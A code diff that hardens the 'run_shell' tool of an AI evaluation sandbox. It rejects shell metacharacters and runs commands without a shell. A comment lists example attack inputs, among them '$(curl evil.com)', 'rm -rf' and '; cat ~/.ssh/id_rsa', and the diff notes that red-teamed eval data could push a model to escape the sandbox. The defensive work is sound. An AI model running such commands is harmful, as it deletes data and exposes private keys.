@@ -12,6 +12,7 @@ import json
 import logging
 import os
 import re
+import shlex
 import shutil
 import statistics
 import subprocess
@@ -233,6 +234,24 @@ EVAL_TOOLS = [
 ]
 
 
+# Shell metacharacters we refuse to let model-generated `run_shell` commands
+# use. Allowing these lets a red-teamed eval dataset exfiltrate secrets or
+# escape the tempdir (e.g. `$(curl evil.com)`, `rm -rf /tmp/other`, `; cat
+# ~/.ssh/id_rsa`). Models that genuinely need pipelines / redirection should
+# call `execute_code` (Python) instead of `run_shell`.
+_SHELL_METACHARS: tuple[str, ...] = (
+    ";",
+    "|",
+    "&",
+    "$(",
+    "`",
+    ">",
+    "<",
+    ">>",
+    "<<",
+)
+
+
 # ---------------------------------------------------------------------------
 # Eval Sandbox (lightweight, no external deps)
 # ---------------------------------------------------------------------------
@@ -296,14 +315,38 @@ class EvalSandbox:
                     return f"Error (exit {result.returncode}): {result.stderr[:500]}"
 
             elif name == "run_shell":
-                cmd = args.get("command", "")
+                cmd_str = args.get("command", "")
+                if not isinstance(cmd_str, str) or not cmd_str.strip():
+                    self.tool_failures += 1
+                    return "Error: empty shell command"
+
+                # Hard-reject shell metacharacters. The sandbox is a tempdir,
+                # not a jail: `$(...)` and `;` can escape it. Pipelines should
+                # use `execute_code` (Python) instead of `run_shell`.
+                if any(m in cmd_str for m in _SHELL_METACHARS):
+                    self.tool_failures += 1
+                    return (
+                        "Error: shell metacharacters not permitted; "
+                        "use execute_code for pipelines"
+                    )
+
+                try:
+                    tokens = shlex.split(cmd_str)
+                except ValueError as exc:
+                    self.tool_failures += 1
+                    return f"Error: could not parse command: {exc}"
+
+                if not tokens:
+                    self.tool_failures += 1
+                    return "Error: empty shell command after parsing"
+
                 result = subprocess.run(
-                    cmd,
-                    shell=True,
+                    tokens,
                     capture_output=True,
                     text=True,
                     timeout=10,
                     cwd=self.workdir,
+                    shell=False,
                 )
                 if result.returncode == 0:
                     self.task_completed = True
@@ -1340,11 +1383,14 @@ def generate_eval_script(config: EvalConfig) -> str:
         import json
         import os
         import re
+        import shlex
         import shutil
         import subprocess
         import sys
         import tempfile
         import time
+
+        _SHELL_METACHARS = (";", "|", "&", "$(", "`", ">", "<", ">>", "<<")
 
         import torch
         from datasets import load_dataset
@@ -1483,7 +1529,22 @@ def generate_eval_script(config: EvalConfig) -> str:
                             self.tool_failures += 1
                             return f"Error (exit {{result.returncode}}): {{result.stderr[:500]}}"
                     elif name == "run_shell":
-                        result = subprocess.run(args["command"], shell=True, capture_output=True, text=True, timeout=10, cwd=self.workdir)
+                        cmd_str = args.get("command", "")
+                        if not isinstance(cmd_str, str) or not cmd_str.strip():
+                            self.tool_failures += 1
+                            return "Error: empty shell command"
+                        if any(m in cmd_str for m in _SHELL_METACHARS):
+                            self.tool_failures += 1
+                            return "Error: shell metacharacters not permitted; use execute_code for pipelines"
+                        try:
+                            tokens = shlex.split(cmd_str)
+                        except ValueError as exc:
+                            self.tool_failures += 1
+                            return f"Error: could not parse command: {{exc}}"
+                        if not tokens:
+                            self.tool_failures += 1
+                            return "Error: empty shell command after parsing"
+                        result = subprocess.run(tokens, capture_output=True, text=True, timeout=10, cwd=self.workdir, shell=False)
                         if result.returncode == 0:
                             self.task_completed = True
                             return result.stdout if result.stdout.strip() else "(success)"
